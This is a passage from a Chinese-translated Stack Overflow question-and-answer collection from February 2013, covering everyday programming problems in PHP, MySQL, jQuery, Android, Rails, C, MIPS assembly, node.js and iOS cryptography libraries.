但是这不起作用，页面没有重定向，jQuery AJAX 调用返回错误，没有 12017，我找不到关于这个错误号的太多信息。

我启用了输出缓冲，并尝试将标头调用放在我的 PHP 文件的顶部，但仍然没有运气。有任何想法吗？谢谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-17T00:57:45.773

I believe if you are using ajax request, you have to handle redirects within javascript (where the request is made).

If your php script sets the Location header of the response when you make an ajax request, it will try to redirect the ajax request not the page that is displayed in the browser.

You can try to handle the error where you make the request (I would have been more specific if I saw the code making the request).

You can try changing your script so that it returns some kind of status code and then handle this status with js/jquery and make the redirect there:

```
document.location=' *new url to redirect the browser to* ' 
```

# mysql - mysql 在一个查询中计算两个表中的记录？

> ID：14916658
> 
> 赞同：3
> 
> 时间：2013-02-17T00:16:08.240
> 
> 标签：mysql, count

我有三个 MySQL 表：

```
patient:
    paID, paCode, paAccountID (foreign key)

test
    tsID, tsName, tsPatientID (foreign key), tsAccountID (foreign key)

account
    acID etc. 
```

现在我想计算`paID`链接`tsID`到特定`acID=1`. 有 6`tsID`和 4`paID`链接到`acID=1`.

```
SELECT Count(paID) AS paCount FROM patient WHERE paAccountID=1
SELECT Count(tsID) AS tsCount FROM test WHERE tsAccountID=1 
```

试图将两者都纳入一个查询...

```
SELECT Count(tsID) AS tsCount, Count(paID) AS paCount
FROM test LEFT JOIN patient ON tsPatientID = paID 
WHERE tsAccountID=1 
```

那样不行，两个计数都返回 6。如何正确处理？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-17T00:19:27.620

我认为假设您的 tsId 和 paId 是唯一键，这应该可以工作：

```
SELECT Count(DISTINCT t.tsID) AS tsCount, 
    Count(DISTINCT p.paID) AS paCount
FROM account a 
    LEFT JOIN test t ON a.acId = t.tsAccountId
    LEFT JOIN patient p ON a.acId = p.paAccountId
WHERE a.acId = 1 
```

这是[SQL Fiddle](http://sqlfiddle.com/#!2/fb1bf4/1)。

请注意：不加入帐户表（并将其用作主表）的问题是，如果测试表或患者表没有特定帐户 id 的数据，则查询将为每个返回 0 个结果 - - 这可能是不正确的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:19:24.027

```
SELECT
    COUNT(DISTINCT tsID) AS tsCount,
    COUNT(DISTINCT paID) AS paCount
FROM
    test
    CROSS JOIN patient
WHERE
    tsAccountID = 1
    AND paAccountID = 1 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-02-17T00:22:36.970

您的 join 方法返回所有相关的行，因此您的计数将始终返回返回的所有行数

在这种情况下，我会在主选择查询中使用 (select count(*) from [Table] Where [id=x]) as [tsCount]) 作为字段..

# php - foreach ($rows as $row) 不能添加html标签

> ID：14916661
> 
> 赞同：-1
> 
> 时间：2013-02-17T00:17:04.100
> 
> 标签：php, mysqli

从[这个问题](https://stackoverflow.com/questions/14915573/unable-to-list-all-records-from-the-table-in-php-and-mysqli/14915589#14915589)开始，现在我需要对输出进行样式设置，只是发现 php 不喜欢我放置标签的方式，我也尝试将其封装在`"`or`.`但`<?php $row['field'] ?>`仍然不起作用。

```
 <table class="table table-hover">
<caption>List All Customers from Customer Table</caption>
<thead>
<tr>
<th>id</th>
<th>Inital</th>
<th>First Name</th>
<th>Last Name</th>
<th>Mobile</th>
<th>Landline</th>
<th>Email</th>
<th>Address</th>
<th>Post Code</th>
</tr>
 </thead>
<tbody>
<tr>
<?php
foreach ($rows as $row) { 
?>
 <td><?php $row['clientid']; ?></td>
 <td><?php $row['inital']; ?></td> 
 <td><?php $row['firstname']; ?></td>
 <td><?php $row['lastname']; ?></td>
 <td><?php $row['mobile']; ?></td>
 <td><?php $row['landline']; ?></td>
 <td><?php $row['email']; ?></td>
 <td><?php $row['address']; ?></td>
 <td><?php $row['postcode']; ?></td>
 <?php } ?>
</tr>
</tbody>
</table> 
```

它不起作用，没有结果。:(拔毛！看了其他问题，但北向足够清晰。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-17T00:18:18.837

添加`echo`..

```
<td><?php echo $row['clientid']; ?></td>
<td><?php echo $row['inital']; ?></td> 
<td><?php echo $row['firstname']; ?></td>
<td><?php echo $row['lastname']; ?></td>
<td><?php echo $row['mobile']; ?></td>
<td><?php echo $row['landline']; ?></td>
<td><?php echo $row['email']; ?></td>
<td><?php echo $row['address']; ?></td>
<td><?php echo $row['postcode']; ?></td> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:34:47.803

尝试从您的评论中编辑您的代码：可能您只是没有将值推送到 $rows 数组中。

```
<?php 
 $rows = array() ;
 $result = $dbc->query('SELECT * FROM customer');
 if ($result){
   while ($row = $query->fetch_assoc()){
    $rows[] = $row ; //Put your data in the array first. 
   }
 }
?>

<table>
<tbody> 
 <tr> 
<?php 
 foreach ($rows as $row) { ?> 
  <td><?php echo $row['clientid']; ?></td> 
  <td><?php echo $row['inital']; ?></td> 
  <td><?php echo $row['firstname']; ?></td> 
<?php } ?> 
 </tr> 
</tbody> 
</table> 
```

# jquery - 使用 mouseup 函数显示长度为 0 的目标

> ID：14916662
> 
> 赞同：0
> 
> 时间：2013-02-17T00:17:17.797
> 
> 标签：jquery, target, mouseup

我试图在单击按钮时创建覆盖，然后在用户单击覆盖外部时将其删除。在我的示例中，当单击叠加层时，目标返回长度为“0”，我无法弄清楚为什么当此方法与我使用过的其他示例一起使用时。任何的想法？

这是js

```
$(document).ready(function() {
    $(document).on("click",".pop", function() {
       if ($('#search-overlay').length === 0) {
           $('body').append('<div id="search-overlay"></div>');
        }
    });
    $(document).on("mouseup", function(e) {
      var container = $("#search-overlay");
      if (container.has(e.target).length === 0) {
        alert(container.has(e.target).length);
        container.remove();
      }
    });
}); 
```

以及您在其中看到它的链接[http://jsfiddle.net/CwrAh/](http://jsfiddle.net/CwrAh/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T00:27:12.083

那是因为[`.has()`](http://api.jquery.com/has/)寻找后代，它与 jQuery 对象内部的元素不匹配。一项额外的检查来修复您的逻辑：

```
if (!container.has(e.target).length && !container.is(e.target)) { 
```

[**小提琴**](http://jsfiddle.net/CwrAh/5/)

考虑到性能时，您可以将函数替换为元素与jQuery 对象中包含的第一个元素[`is()`](http://api.jquery.com/is/)之间的简单比较：`e.target``container`

```
 if (!container.has(e.target).length && container[0] !== e.target) { 
```

[**小提琴#1.1**](http://jsfiddle.net/CwrAh/4/)

* * *

您还可以进一步简化它[`.closest()`](http://api.jquery.com/closest/)：

```
if (!$(e.target).closest(container).length) { 
```

[**小提琴 #2**](http://jsfiddle.net/CwrAh/2/)

相同的逻辑，但反过来。`closest`开始尝试匹配包含在 jQuery 对象中的元素，并向上遍历 DOM 树寻找匹配的祖先覆盖。结果与第一个版本相同。

* * *

第三个变体，它放弃了逻辑测试的需要。附加一个 mouseup 处理程序，停止事件传播到覆盖，因此它不会到达`document`：

```
$('body').append($('<div>', {
    id: 'search-overlay',
    mouseup: function(e) {
        e.stopPropagation();
   }
})); 
```

[**小提琴#3**](http://jsfiddle.net/CwrAh/3/)

# android - 通过 applyTransformation 更改其高度后，LinearLayout 未正确显示

> ID：14916664
> 
> 赞同：0
> 
> 时间：2013-02-17T00:17:27.817
> 
> 标签：android, animation, height, android-linearlayout, gradient

我正在尝试在我的`LinearLayout`through上执行平滑过渡（展开/折叠） `Animation`。这是我用于动画的代码：

```
Animation anim = new Animation(){
    @Override
    protected void applyTransformation(float interpolatedTime, Transformation t){
        super.applyTransformation(interpolatedTime, t);
        layout.getLayoutParams().height = (int)(84*interpolatedTime);
        layout.requestLayout();
    }
}; 
```

问题是展开/折叠动画效果很好，但是一旦动画完成，布局本身就无法正确显示。下面的灰色渐变块是它的样子（而不是 textview 和 edittext）：

![布局渲染不当](../Images/89d2461c2483f42abf634faf4ac5ee81.png)

即使我在打电话`layout.requestLayout();`，但它仍然不会在每个 interpolatedTime 时间刷新布局图。我在这里缺少什么吗？

***PS我在设置高度时使用84**的原因是因为我知道我的布局的渲染高度并且它仅在测试/调试过程中静态定义。*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T04:50:27.117

我想我已经想通了！关键答案是将您的视图高度设置`LayoutParams.WRAP_CONTENT`为**interpolatedTime**时间等于**1**。例如：

```
if(interpolatedTime == 1)
     layout.getLayoutParams().height = LayoutParams.WRAP_CONTENT;
else
     layout.getLayoutParams().height = (int)(84 * interpolatedTime); 
```

*注意：这里 84 是我的视图的高度，实际上它应该使用动态检索`layout.getMeasuredHeight()`*

# ruby-on-rails - 为什么 .each 只通过第一个元素？

> ID：14916672
> 
> 赞同：0
> 
> 时间：2013-02-17T00:18:17.563
> 
> 标签：ruby-on-rails, ruby

我写了这个方法：

```
def create_demo_organizations

  sample_organizations = [ '37 Signals', 'Fog Creek']

  sample_organizations.each { |item|
    Organization.first_or_create(
        name: item,
        time_zone: 'Central'
    )
  }

end 
```

我希望它会为我创建两个名称在数组中的组织，但是当我在 UI 管理工具中打开它时，我只能看到第一行是“37 个信号”，而不是第二行。我写错了吗？

我的目标是遍历该数组的成员并将它们插入数据库。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-17T01:03:52.083

首先尝试将活动记录代码与循环代码隔离开来。所以开始：

```
sample_organizations.each do |item|
  puts item
end 
```

如果您要打印这两个项目，请添加一个更简单的 AR 调用：

```
sample_organizations.each do |item|
  Organization.create(name: item)
end 
```

然后最后：

```
sample_organizations.each do |item|
  Organization.find_or_create(name: item)
end 
```

**编辑：**

我不认为你打电话`first_or_create`正确。你可能想要这样的东西：

```
Organization.where(name: item).where(time_zone: 'Central').first_or_create 
```

# sparql - 如何从维基百科获取完整的页面标题列表？

> ID：14916674
> 
> 赞同：2
> 
> 时间：2013-02-17T00:18:36.533
> 
> 标签：sparql, dbpedia, wikipedia-api

我想得到这个列表，以便以后进行语言学研究。

[API:Allpages](http://www.mediawiki.org/wiki/API%3aAllpages) 限制[为 500 个查询](http://en.wikipedia.org/w/api.php?action=query&list=allpages&apfrom=Kre&aplimit=500)。我需要它们（400万）。

也许使用 dbpedia 攻击它。

有什么诀窍吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-17T00:22:04.597

运行 Wikipedia 的 Wikimedia Foundation 将其所有项目的定期转储发布到[http://dumps.wikimedia.org](http://dumps.wikimedia.org)。

您可以在此处浏览最新的 enwiki 转储（截至本文发布时）：http: [//dumps.wikimedia.org/enwiki/20130204/](http://dumps.wikimedia.org/enwiki/20130204/)。

您可能最感兴趣的文件是所有页面标题的列表：http: [//dumps.wikimedia.org/enwiki/20130204/enwiki-20130204-all-titles-in-ns0.gz](http://dumps.wikimedia.org/enwiki/20130204/enwiki-20130204-all-titles-in-ns0.gz)。

# c - 为什么 free() 只将前 8 个字节设置为零？

> ID：14916678
> 
> 赞同：1
> 
> 时间：2013-02-17T00:19:19.713
> 
> 标签：c, memory-management, malloc, free

我有一个关于 free() 行为的问题。

Juste 一个简单的代码，它使用 malloc 和 strcpy 一个 char*。因此，一切都设置在 HEAP 上：

```
(gdb) x/100b 0x602010
0x602010:   66  111 110 106 111 117 114 32
0x602018:   116 111 117 116 32  108 101 32
0x602020:   109 111 110 100 101 0   0   0
0x602028:   0   0   0   0   0   0   0   0
0x602030:   0   0   0   0   0   0   0   0
0x602038:   33  0   0   0   0   0   0   0 
```

当我使用 free() 释放块时，结果是：

```
(gdb) x/100b 0x602010
0x602010:   0   0   0   0   0   0   0   0
0x602018:   116 111 117 116 32  108 101 32
0x602020:   109 111 110 100 101 0   0   0
0x602028:   0   0   0   0   0   0   0   0
0x602030:   0   0   0   0   0   0   0   0
0x602038:   33  0   0   0   0   0   0   0 
```

简单的代码来证明：

```
int main ()
{
    const char * str = "Bonjour tout le monde";

    char *ptr = (char *) malloc (strlen(str) + 1);
    strcpy(ptr, str);

    printf("*ptr : %s\n\n", ptr);

    free(ptr);

    printf ("After free ptr = %p\n", ptr);
    printf ("Content ptr    : %s\n", ptr);
    printf ("Content ptr+8 : %s\n", ptr+8);

    return 0;
} 
```

* * *

输出 ：

```
*ptr : Bonjour tout le monde

After free ptr = 0x13c7010
Content ptr    : 
Content ptr+8 : tout le monde 
```

有人有答案吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-17T00:24:52.733

`free()`不需要清除内存，实际上也不应该这样做，因为这样做会花费时间并覆盖缓存的数据而没有普遍需要的好处。

它当然可以将内部空间用于自己的目的。您所看到的可能只是分配器跟踪空闲内存的副作用。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-17T00:28:11.380

一个更好的问题是；为什么你认为它应该做其他事情？您在哪里找到有关强制实施的文件`free`？它不存在，所以问这样的问题是没有意义的。

`free`只需将该内存标记为已释放。未指定调用后该内存块会发生什么`free`。

* * *

顺便说一句，这是UB：

```
printf ("Content ptr    : %s\n", ptr);
printf ("Content ptr+8 : %s\n", ptr+8); 
```

# java - 是否可以仅在 twitter api 上提取具有图像或视频的推文？

> ID：14916679
> 
> 赞同：-3
> 
> 时间：2013-02-17T00:19:21.120
> 
> 标签：java, android, api, twitter

我尝试在 php 上使用 twitter api，这是非常基本的公共推文拉取。现在我正在java和android上学习它，我的代码应该拉动或处理上面有图像或视频的推文。我阅读了 twitter api 的文档并搜索了相当长的时间，但到目前为止我找不到好的文档、教程或示例。

你有什么想法吗？或者您可以分享的示例代码？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T00:58:07.940

Get all tweets of your request, decode the redirector links (such as bit.ly) to get the actual links and then check for the domain (such as youtube.com or instagram.com). If you just want to show the tweet, you're fine but actually getting the image that the link points to is harder because you need to implement it for every single imagehoster you want to support.

To access to Twitter you can use Twitter4j. As far as I know it is not possible to get [native media previews](http://www.jarvana.com/jarvana/view/org/twitter4j/twitter4j-core/2.2.4/twitter4j-core-2.2.4-javadoc.jar!/twitter4j/Annotations.html) with Twitter4j (but you can use the links as described above).

# php - 带有表单值的php重定向

> ID：14916683
> 
> 赞同：0
> 
> 时间：2013-02-17T00:19:41.063
> 
> 标签：php, html, forms

我是 php 的初学者，但我想编写一个脚本，将我重定向到一个属性等于表单输入值的地址。这是正确的方法吗？

索引.html

```
<form action="process.php" method="post">
    <input type="text" name="name" placeholder="Your Name" />
    <input type="submit" />
</form> 
```

继承人process.php：

```
<?
    header('Location: level1.html?name=' . $_POST['name']);
?> 
```

由于某种原因，它不起作用。有没有更好的办法？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:20:32.273

```
<?
    header('Location: level1.html?name=' . $_POST['name']);
?> 
```

改成

```
<?php
    header('Location: level1.html?name=' . $_POST['name']);
?> 
```

编辑：

确保在使用前不输出任何内容`header()`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T01:10:00.233

我建议您查看异步帖子，它更快且无需处理 php 标头（尤其是如果您之前编写过任何标记语言，它将无法工作），您可以简单地使用 js/jQuery 转发任何任何地方的价值观。除非 js 被关闭。

# html - 为什么我的按钮偏离中心？

> ID：14916684
> 
> 赞同：0
> 
> 时间：2013-02-17T00:19:44.917
> 
> 标签：html, css

这是我正在谈论的图像：

![在此处输入图像描述](../Images/4be2748597afc41acfd9c9a2b3955b4c.png)

这些按钮没有按照应有的方式彼此垂直对齐。

这是我的 HTML 代码：

```
 <div class="incorrect-guesses">
                <h4>Incorrect Guesses</h4>
                <div class="incorrect-guess">A</div>
                <div class="incorrect-guess">A</div>
                <div class="incorrect-guess">A</div>
                <div class="incorrect-guess">A</div>
                <div class="empty-guess"></div>
                <div class="empty-guess"></div>
                <div class="empty-guess"></div>
                <div class="empty-guess"></div>
            </div> 
```

以及作用于它们的 CSS：

```
.empty-guess {
    display: inline-block;
    width: 38px;
    height: 38px;
    margin: 0 3px 6px 0;

    border: 1px solid #ccc;
}

.incorrect-guess {
    display: inline-block;
    width: 40px;
    height: 40px;
    margin: 0 3px 6px 0;

    background: #e32a3c;
    color: #fff;
    line-height: 2.5em;
    text-align: center;
    text-decoration: none;
} 
```

我已经多次使用 web-inspector 来查看是否有任何东西以这种方式将它们分开，但似乎没有什么是我可以在 web-inspector 中检测到的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T00:21:46.460

只需添加`vertical-align: bottom`到空元素。

[http://jsfiddle.net/G3Kky/](http://jsfiddle.net/G3Kky/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:50:23.617

A quick fix for this annoying problem is to `float` the divs to the `left`. All other CSS can remain the same.

```
.empty-guess, .incorrect-guess {
   float: left;
} 
```

This is the result:

![Fixed image with float:left](../Images/dd098c8f9934ea69221fd0f1ca0a88cc.png)

[JS Fiddle Example](http://jsfiddle.net/3bqtn/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-17T00:26:16.947

什么爆炸药丸说的，或者在所有元素上使用这个：

```
display: block;
float: left; 
```

# c - 循环遍历数组 MIPS 程序集

> ID：14916686
> 
> 赞同：5
> 
> 时间：2013-02-17T00:19:52.570
> 
> 标签：c, arrays, assembly, while-loop, mips

我正在开发一个循环遍历 10 个数字的数组的程序。前 9 个元素的值大于 0，第 10 个元素的值为 0。遇到 0 时循环应该中断。

```
i=0;
while(A[i]!=0)
{
    A[i]=A[i]+1;
    i++;
} 
```

我知道如果寄存器的值等于 0，我可以使用“beq”来中断循环。但是我对在内存中操作值知之甚少。

这是我第一次使用 MIPS，你会发现它一团糟。如果你不能帮我解决它，你能给我一些指点吗？

```
.data  #by default, the "data segment" starts at address 0x10010000
.word 1
.word 2
.word 3
.word 4
.word 5
.word 6
.word 7
.word 8
.word 9
.word 0

.text #instructions start below

# MIPS assembly code

lui  $a0, 0x1001           # $a0 = 0x10010000
addi $a1, $zero, 0         # i = 0
jal increment              # call the procedure 
```

这是我最迷失的地方：

```
increment:
lui $a0, 0x1001           # $a0 = 0x10010000
beq $a0, $zero, else      # if $a0 holds 0 goto 'else'
addi $a0, $a0, 2          # +2
addi $a1, $zero, 1        # i = i + 1

jr $ra                   #jump to caller 
```

$v0 应该保存所有增量值的总和。

```
else: 
add $a0, $v0, $zero #copy result as input to syscall
addi $v0,$zero,1 #service 1 for syscall is print integer
syscall 
```

以无限循环结束。

```
infinite: j infinite 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-17T00:57:17.843

To load a value from a memory, you need to call one of the load instructions, (`lw`, `lh` or `lb` for word, half-word and byte). for example:

```
lw $a1, 0($a2) # load a word from the address in $a2 + offset 0 to $a1 
```

to write a value in memory, you use one of the store commands, for example:

```
sw $a1, 0($a2) # store the word in $a1 into the address in $a2 + offset 
```

loading an address into a register is done using la, for example

```
la $a2, label_of_array # load the address of the label 'label_of_array' into $a2 
```

Now, to manipulate the value in the array, you need to combine the three instructions from above:

```
la $a1, label_of_array   # load the address of the array into $a1
lb $a2, 0($a1)           # load a byte from the array into $a2
addi $a2, $a2, 1         # increment $a2 by 1
sb $a2, 0($a1)           # store the new value into memory
addi $a1, $a1, 1         # increment $a1 by one, to point to the next element in the array 
```

And another point:

You wrote `addi $a1, $zero, 1 # i = i + 1` but this is wrong. What you did is to store the result of `$zero + 1` which is `1` into `$a1`. In order to increment `$a1`, you need to write `addi $a1, $a1, 1` which is "store the result of `$a1 + 1` into `$a1`.

# c# - 更新 WinRT 中的 ListViewItem 控件

> ID：14916687
> 
> 赞同：1
> 
> 时间：2013-02-17T00:19:58.723
> 
> 标签：c#, .net, windows-runtime

我的 WinRT 应用程序中有一个使用自定义 ListView 的 ListView。根据 Microsoft 的建议，自定义 ListView 类只是覆盖 PrepareContainerForItemOverride() 以便我可以有交替的背景：

[http://msdn.microsoft.com/en-us/library/ms750769%28v=VS.85%29.aspx](http://msdn.microsoft.com/en-us/library/ms750769%28v=VS.85%29.aspx)

如那里所述，当从列表中删除项目时，它不会自动更新备用背景。它为此提供了一个解决方案：

```
ICollectionView dataView =
  CollectionViewSource.GetDefaultView(theListView.ItemsSource);
dataView.Refresh(); 
```

但是，CollectionViewSource.GetDefaultView 位于 System.Windows.Data - WinRT 不可用。

我已经尝试在文档和网络上搜索替代方案，但我一直在偶然发现 WPF 代码。我找不到任何刷新数据的方法 - 目前我所能想到的就是删除所有数据并重新添加它，这显然很疯狂。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T14:07:26.820

我设法得到了一个简单的“解决方案”，所以我想我会把它包括在这里。

我刚刚将以下内容添加到 App.xaml.cs：

在 OnLaunched 中，最后，之后：

```
Window.Current.Activate(); 
```

我添加了

```
Window.Current.VisibilityChanged += ForceListUpdate; 
```

ForceListUpdate 是：

```
private void ForceListUpdate(object sender, ICoreWindowEventArgs e)
{
    if (!Window.Current.Visible)
    {
        DataSource.ForceListUpdate();
    }
} 
```

和 DataSource.ForceListUpdate 是：

```
public static void ForceListUpdate()
{
    if (_dataSource.Content.Count != 0)
        _dataSource.Content.Move(0, 0);
} 
```

我在删除时禁用动画做了很多事情，但这很丑陋。使用此方法，如果删除了某个项目，则交替颜色不匹配 - 直到窗口不可见，此时它会刷新。这是迄今为止我找到的最好的解决方案。

# node.js - node.js，需要帮助来修复这个错误“TypeError：对象不是函数”

> ID：14916689
> 
> 赞同：0
> 
> 时间：2013-02-17T00:20:12.553
> 
> 标签：node.js

我正在学习 node.js。在 cloud9 上尝试一些演示。演示很简单，只有2个js文件。我逐行检查，一切似乎都很好。请帮我调试它。

1.  资源.js 文件。

    ```
     var util = require('util');
            var EventEmitter = require('events').EventEmitter;

            function Resource(m){

                var maxEvents = m;
                var self = this;

                process.nextTick(function(){
                    var count = 0;

                    self.emit('start');
                    var t = setInterval(function(){
                        self.emit('data', ++count);

                        if(count === maxEvents){
                            self.emit('end', count);
                            clearInterval(t);
                        }
                    }, 10);
                });

            };

            util.inherits(Resource, EventEmitter); 
    ```

2.  7-extEmitter.js

    ```
     var Resource = require('./resource');

            var r = new Resource(7);

            r.on('start', function(){
                console.log("I've started!");
            });

            r.on('data', function(d){
                console.log("    I received data -> " + d);
            });

            r.on('end', function(t){
                console.log("I'm done, with " + t + " data events.");
            }); 
    ```

这是我收到的错误消息：

```
 Your code is running at 'http://node.myw714.c9.io'.
            Important: use 'process.env.PORT' as the port and 'process.env.IP' as the host in your scripts!
            /var/lib/stickshift/511e07b5500446f25c0001bd/app-root/data/407149/7-extEmitter.js:4
            var r = new Resource(7);

              ^
            TypeError: object is not a function
                at Object. (/var/lib/stickshift/511e07b5500446f25c0001bd/app-root/data/407149/7-extEmitter.js:4:9)
                at Module._compile (module.js:449:26)
                at Object.Module._extensions..js (module.js:467:10)
                at Module.load (module.js:356:32)
                at Function.Module._load (module.js:312:12)
                at Module.runMain (module.js:492:10)
                at process.startup.processNextTick.process._tickCallback (node.js:244:9) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T00:33:23.240

您只需要删除该初始化代码。

```
 var r = require('./resource');

    r.on('start', function(){
        console.log("I've started!");
    });

    r.on('data', function(d){
        console.log("    I received data -> " + d);
    });

    r.on('end', function(t){
        console.log("I'm done, with " + t + " data events.");
    }); 
```

并在resource.js中添加这一行，如果你想让它更通用，你应该改变函数结构以允许设置值m。

```
module.exports = new Resource(7); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-04T16:02:33.303

在 resource.js 文件中的 utils.inherit 下，您只需添加以下内容：

```
module.exports = Resource; 
```

其余的代码都很好。

# ios - iOS 中的椭圆曲线加密

> ID：14916695
> 
> 赞同：21
> 
> 时间：2013-02-17T00:20:36.883
> 
> 标签：ios, objective-c, cryptography, elliptic-curve

我正在尝试将 ECC 合并到一个用于安全通信的 iPhone 应用程序中，但我很难找到一个合适的库/教程来说明如何在 Objective-c 中做到这一点。我读了这篇文章： [如何在 iOS 中使用 ECC](https://stackoverflow.com/questions/11563229/how-to-use-ecc-in-ios) 但它是在将近一年前发布的，没有任何回应。任何提示/建议将不胜感激

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-03-27T09:06:54.643

根据我的经验，您可以使用 Nacl 库。这个库有curve25519椭圆曲线实现。这是最先进的和最快的库。

您还可以使用加密++。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-10T08:08:38.873

在 Mac 库中快速搜索椭圆曲线加密产生了[EllipticLicense](https://github.com/dchest/ellipticlicense)，这是一个使用 EC 加密的 Mac 产品密钥生成/验证库。它使用 OpenSSL 对 EC 的支持，您也可以这样做。

请注意，Apple 已弃用其提供的 OpenSSL 动态库，因为兼容性问题会阻止它们保持最新状态，因此您需要[从源代码](http://www.openssl.org)中获取 OpenSSL并将其与您的应用程序捆绑在一起。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-05-08T13:55:54.667

不幸的是，我找不到合适的文档，但也许您可以使用 Apple 的 CommonCrypto 框架？

这个标题很有希望：http: [//opensource.apple.com/source/CommonCrypto/CommonCrypto-60027/Source/CommonCryptoSPI/CommonECCryptor.h](http://opensource.apple.com/source/CommonCrypto/CommonCrypto-60027/Source/CommonCryptoSPI/CommonECCryptor.h)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-05-07T14:24:31.747

不幸的是，Security Transforms [1]（应该使用的 iOS 内置框架和上面提到的帖子使用的那个）似乎不支持内置的椭圆曲线。你将不得不依赖一个非苹果实施ECC。

[1] [http://developer.apple.com/library/mac/#documentation/Security/Conceptual/SecTransformPG/SecurityTransformsBasics/SecurityTransformsBasics.html](http://developer.apple.com/library/mac/#documentation/Security/Conceptual/SecTransformPG/SecurityTransformsBasics/SecurityTransformsBasics.html)

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2013-09-25T20:12:49.517

这不是你要的答案。但是，我的偏执迫使我建议您花时间真正了解 ECC 实施的具体细节。考虑一下这个关于[NSA 后门](http://www.wired.com/threatlevel/2013/09/nsa-backdoor/)的出版物。

如果您从文章中得到的仅此而已，请注意：“RSA Security 公开放弃 Dual_EC_DRBG”。

我查看了[已验证各种 DRBG](http://csrc.nist.gov/groups/STM/cavp/documents/drbg/drbgval.html#209)算法的供应商列表。似乎 Apple 直接为大多数平台和操作系统验证了 CRT_DRBG。在清楚的权利？不必要。如果您仔细观察，似乎有些供应商已经验证了 Dual EC DRBG，其技术可能已内置到 Apple 产品中。如何以及在哪里使用它？我无法确定这一点。

例如：向下滚动到验证号 309。我不确定我是否正确阅读。但我的看法是，Cummings 是（或打算成为）带有 ARM A8 内核和 iOS 5.0 的 Apple 移动设备的 OEM 供应商。他们验证了他们的加密通信模块，其中包括双 EC DRBG。什么时候使用？我所知道的是它说它既“启用又未启用”。什么时候？！不知道。请注意，还有其他几种“启用和未启用”的 DRBG 风格。这只能降低使用的概率。

看来底线是：

*   双 EC DRBG 可用于在未知数量的场景中在合格平台上使用 SHA 的加密函数中。

*   我们将不得不等待调查解决，以确保
    当局怀疑它是后门。

祝你今天过得愉快。:)

PS 我忍不住关心 OpenSSL。我发现[这篇文章](https://crypto.stackexchange.com/questions/10530/dual-ec-drbg-and-openssl-on-a-mac)揭示了有关如何澄清 OpenSSL 是否使用黑名单随机数生成器的未知数。

# java - ListView — 子项 onClick() 阻止 onItemClick()

> ID：14916699
> 
> 赞同：2
> 
> 时间：2013-02-17T00:21:05.097
> 
> 标签：java, android, android-layout, android-listview, android-cursoradapter

我正在扩展 a`CursorAdapter`以将数据绑定到 a 中的视图`ListView`。当项目内的子视图具有`onClick()`侦听器时，`onItemClick()`不会为该行调用。我希望调用子视图的`onClick()`方法，并调用该`onItemClick()`方法，并在触摸时突出显示该行（默认情况下，当子视图没有`onClickListener()`附加时）。其他触摸方法（如`onLongClick()`）返回 a `boolean`，指示是否使用了触摸事件，但该`onClick()`方法返回 void，并且就像它具有`boolean`返回一样`true`。

在我的 activity_main.xml 我有：

```
<ListView ...[attributes] ...
    android:id="@+id/stations" >    
</ListView> 
```

对于填充的视图`ListView`：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout ...[attributes] ... >   
    <ImageView
        ...[attributes] ...
        android:id="@+id/station_drag" />
    <TextView xmlns:android="http://schemas.android.com/apk/res/android"
        ...[attributes] ...
        android:id="@+id/station_title" >
    </TextView>
</RelativeLayout> 
```

和我的`CursorAdapter`班级：

```
public class RadioCursorAdapter extends CursorAdapter {

    protected Activity mContext;

    public RadioCursorAdapter(Activity context, Cursor c, int flags) {
        super(context, c, flags);
        this.mContext = context;
    }

    @Override
    public void bindView(View view, Context context, Cursor cursor) {
        TextView titleView = (TextView) view.findViewById(R.id.station_title);

        final String url = cursor.getString(cursor.getColumnIndexOrThrow(RadioDbContract.StationEntry.COLUMN_NAME_URL));
        titleView
                .setText(cursor.getString(cursor.getColumnIndexOrThrow(RadioDbContract.StationEntry.COLUMN_NAME_TITLE)));
        // commenting out the following makes the listView's onItemClickListener
        // work, and row highlights while pressed
        titleView.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                // this part works when the text is clicked, but prevents
                // onItemClick in listview
            }
        });
    }

    @Override
    public View newView(Context context, Cursor cursor, ViewGroup parent) {
        final LayoutInflater inflater = LayoutInflater.from(mContext);
        View v = inflater.inflate(R.layout.station_entry, null);
        return v;
    }
} 
```

我已经尝试获取 的父级`titleView`及其父级，并手动调用`onClick()`，但这似乎不起作用，`onItemClick()`是一个不同的处理程序。我已经尝试了`android:descendantFocusability`,`android:focusable`以及`android:clickable`我能想到的视图层次结构的每个级别的每种组合。

请将任何答案与其他关于我可能会采取不同做法的评论区分开来（比如不为每个视图创建新的侦听器？）

* * *

**编辑：**

